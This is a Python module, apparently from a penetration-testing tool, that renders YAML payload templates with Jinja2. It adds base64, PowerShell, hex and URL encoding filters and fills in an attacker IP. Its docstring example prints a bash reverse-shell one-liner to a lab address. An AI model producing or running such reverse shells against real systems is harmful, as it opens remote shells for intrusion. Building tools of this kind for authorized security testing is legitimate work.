"""Jinja2-based template rendering engine."""

from pathlib import Path
from typing import Any, Dict, Optional

from jinja2 import Environment

from .context import compute_dynamic_values
from .filters import base64_encode, base64_pwsh, hex_encode, url_encode
from .loader import YamlContentLoader


def include_template(template_name: str, env: Environment, context: dict) -> str:
    """
    Custom include function for use in Jinja2 expressions.

    This allows templates to use {{ include('path') }} syntax
    which can then be piped through filters.

    Args:
        template_name: Name of template to include
        env: Jinja2 environment
        context: Current template context

    Returns:
        Rendered content of the included template
    """
    template = env.get_template(template_name)
    return template.render(**context)


def create_environment(templates_dir: Path) -> Environment:
    """
    Create and configure Jinja2 environment with custom loader and filters.

    Args:
        templates_dir: Base directory containing templates

    Returns:
        Configured Jinja2 environment
    """
    env = Environment(
        loader=YamlContentLoader(templates_dir),
        autoescape=False,  # We're generating shell commands, not HTML
        keep_trailing_newline=False,  # Remove trailing newlines automatically
    )

    # Register custom filters
    env.filters['url_encode'] = url_encode
    env.filters['base64'] = base64_encode
    env.filters['base64_pwsh'] = base64_pwsh
    env.filters['hex_encode'] = hex_encode

    return env


def render_template(
    template_path: str,
    templates_dir: Path,
    config: Dict[str, Any],
    debug: bool = False
) -> tuple[str, Optional[Dict[str, Any]]]:
    """
    Render a template file using Jinja2.

    Args:
        template_path: Relative path to template (e.g., "payloads/revshell.yaml")
        templates_dir: Base directory containing templates
        config: Configuration dictionary
        debug: If True, return debug information

    Returns:
        Tuple of (rendered_output, debug_info)
        debug_info is None when debug=False

    Example:
        >>> output, _ = render_template("payloads/revshell.yaml", templates_dir, config)
        >>> print(output)
        bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
    """
    env = create_environment(templates_dir)
    context = compute_dynamic_values(config)

    # Add include function to context with access to env and context
    from functools import partial
    context['include'] = partial(include_template, env=env, context=context)

    template = env.get_template(template_path)

    # Get raw template source for debug mode
    raw_source = None
    if debug:
        source, _, _ = env.loader.get_source(env, template_path)
        raw_source = source

    rendered = template.render(**context)

    # Remove trailing newline for clean clipboard content
    if rendered.endswith('\n'):
        rendered = rendered[:-1]

    debug_info = None
    if debug:
        debug_info = {
            'template_path': template_path,
            'context': context,
            'raw_template': raw_source,
            'rendered_output': rendered
        }

    return rendered, debug_info


def render_template_string(
    template_str: str,
    templates_dir: Path,
    config: Dict[str, Any]
) -> str:
    """
    Render a template string directly (useful for testing).

    Args:
        template_str: Template content as string
        templates_dir: Base directory for resolving includes
        config: Configuration dictionary

    Returns:
        Rendered output

    Example:
        >>> render_template_string("IP: {{ attacker_ip }}", templates_dir, config)
        "IP: 10.10.14.5"
    """
    env = create_environment(templates_dir)
    context = compute_dynamic_values(config)

    # Add include function to context
    from functools import partial
    context['include'] = partial(include_template, env=env, context=context)

    template = env.from_string(template_str)
    rendered = template.render(**context)

    if rendered.endswith('\n'):
        rendered = rendered[:-1]

    return rendered
